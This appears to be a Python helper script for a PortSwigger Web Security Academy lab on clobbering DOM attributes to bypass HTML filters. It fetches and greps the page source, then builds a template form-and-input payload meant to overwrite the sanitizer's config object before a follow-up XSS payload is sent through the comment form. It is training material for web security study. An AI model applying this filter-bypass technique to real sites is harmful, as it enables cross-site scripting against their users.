"""
Lab 7: Clobbering DOM attributes to bypass HTML filters
https://portswigger.net/web-security/dom-based/dom-clobbering/lab-clobbering-dom-attributes-to-bypass-html-filters
Difficulty: Expert

📝 The flaw: the page's OWN sanitizer/filter reads its configuration from a
global object (e.g. checking `window.ANCHOR_CONFIG.allowedTags` or similar)
before deciding what to strip. Clobber THAT config object so the sanitizer's
own settings get overwritten — effectively disabling or weakening the filter
from the inside, using only HTML the filter itself still allows through.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
INJECTION_PATH = "/post/comment"


def build_config_clobbering_payload():
    """
    Clobber a config object's boolean/array property so the sanitizer thinks
    a dangerous tag/attribute is allowlisted. Exact config variable name and
    expected shape MUST be confirmed from the page's filter JS source first —
    this is a representative shape, not a fixed universal payload.
    """
    return (
        '<form id="test-config"><input id="test-config" name="config" '
        'value="allow-scripts"></form>'
    )


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("This lab's clobbering target is the SANITIZER's own settings object,")
    note("not a content sink directly — find where the filter code reads")
    note("`window.<something>` to decide what's allowed before it runs.")
    grep_for_patterns(source, ["sanitize", "allow", "window."])

    payload = build_config_clobbering_payload()
    log(f"Config-clobbering payload (template — confirm real config shape): {payload}")

    note("Submit via the comment form, then follow up with the actual XSS")
    note("payload that the (now-weakened) filter should let through unscathed.")
    note("Because the exact clobbered property varies by lab build, treat this")
    note("script as a starting scaffold — step through the filter's source in")
    note("a debugger to nail down the real property name before relying on it.")


if __name__ == "__main__":
    run()
